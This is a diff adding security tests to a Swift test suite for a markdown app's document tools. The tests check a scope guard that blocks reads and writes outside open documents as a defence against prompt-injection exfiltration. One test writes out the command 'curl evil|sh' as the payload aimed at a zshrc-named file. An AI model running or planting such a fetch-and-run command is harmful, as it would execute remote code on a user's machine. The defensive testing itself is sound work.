@@ -237,6 +237,7 @@ final class ToolRegistryTests: XCTestCase {
 final class ToolImplementationTests: XCTestCase {
 
     private var tempPath: String!
+    private var registryURL: URL!
 
     override func setUp() {
         super.setUp()
@@ -245,12 +246,32 @@ final class ToolImplementationTests: XCTestCase {
         try? FileManager.default.createDirectory(at: tempDir,
                                                   withIntermediateDirectories: true)
         tempPath = tempDir.appendingPathComponent("doc.md").path
+
+        // Register tempPath as an "open" document so the scope guard in
+        // requirePath admits it. Point DocumentRegistry at a staged
+        // registry file instead of the real Application Support one.
+        registryURL = tempDir.appendingPathComponent("active-documents.json")
+        registerOpenDocuments([tempPath])
+        DocumentRegistry.registryFileURLOverride = registryURL
     }
 
     override func tearDown() {
+        DocumentRegistry.registryFileURLOverride = nil
         try? FileManager.default.removeItem(atPath: tempPath)
+        try? FileManager.default.removeItem(at: registryURL)
         tempPath = nil
+        registryURL = nil
         super.tearDown()
+    }
+
+    /// Write a staged active-documents.json listing the given paths as
+    /// open, matching the JSON shape the main app's ActiveDocumentsRegistry
+    /// produces.
+    private func registerOpenDocuments(_ paths: [String]) {
+        let iso = ISO8601DateFormatter().string(from: Date(timeIntervalSince1970: 1_700_000_000))
+        let entries = paths.map { ["path": $0, "openedAt": iso] }
+        let data = try! JSONSerialization.data(withJSONObject: entries)
+        try! data.write(to: registryURL)
     }
 
     func testReadLinesReturnsRequestedRange() throws {
@@ -324,5 +345,60 @@ final class ToolImplementationTests: XCTestCase {
         // Trailing newline + paragraph break + new content + final newline.
         XCTAssertTrue(after.contains("existing body"))
         XCTAssertTrue(after.contains("\n\nnew content"))
+    }
+
+    // MARK: - Scope guard (P0 security fix)
+
+    func testReadLinesRejectsPathOutsideOpenDocuments() throws {
+        // A path that exists but is NOT registered as open must be refused —
+        // this is the prompt-injection-exfiltration defence.
+        let outsideDir = FileManager.default.temporaryDirectory
+            .appendingPathComponent("PicaMDMCPTests-outside-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: outsideDir, withIntermediateDirectories: true)
+        let secret = outsideDir.appendingPathComponent("secret.md").path
+        try "TOP SECRET".write(toFile: secret, atomically: true, encoding: .utf8)
+        defer { try? FileManager.default.removeItem(at: outsideDir) }
+
+        let tool = DocumentTools.readLines()
+        XCTAssertThrowsError(try tool.invoke([
+            "path": secret as Any, "start": 1, "end": 1,
+        ])) { error in
+            XCTAssertTrue("\(error)".contains("not an open PicaMD document"),
+                          "expected scope-guard rejection, got \(error)")
+        }
+    }
+
+    func testReplaceLinesRejectsPathOutsideOpenDocuments() throws {
+        let outsideDir = FileManager.default.temporaryDirectory
+            .appendingPathComponent("PicaMDMCPTests-outside-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: outsideDir, withIntermediateDirectories: true)
+        let victim = outsideDir.appendingPathComponent("zshrc.md").path
+        try "original".write(toFile: victim, atomically: true, encoding: .utf8)
+        defer { try? FileManager.default.removeItem(at: outsideDir) }
+
+        XCTAssertThrowsError(try DocumentTools.replaceLines().invoke([
+            "path": victim as Any, "start": 1, "end": 1, "text": "curl evil|sh",
+        ]))
+        // The victim file must be untouched.
+        XCTAssertEqual(try String(contentsOfFile: victim, encoding: .utf8), "original")
+    }
+
+    func testReadLinesAcceptsTraversalThatResolvesIntoOpenDoc() throws {
+        // `<tempdir>/sub/../doc.md` canonicalizes to the registered tempPath,
+        // so it must be ACCEPTED — the guard compares canonical forms, it
+        // doesn't blanket-reject `..`.
+        let lines = (1...3).map { "line \($0)" }.joined(separator: "\n")
+        try lines.write(toFile: tempPath, atomically: true, encoding: .utf8)
+        let dir = (tempPath as NSString).deletingLastPathComponent
+        // Intermediate dir must exist for resolvingSymlinksInPath to
+        // collapse `..` deterministically.
+        try FileManager.default.createDirectory(atPath: dir + "/sub",
+                                                withIntermediateDirectories: true)
+        let traversal = dir + "/sub/../doc.md"
+
+        let result = try DocumentTools.readLines().invoke([
+            "path": traversal as Any, "start": 1, "end": 1,
+        ]) as? [String: Any]
+        XCTAssertEqual(result?["text"] as? String, "line 1")
     }
 }
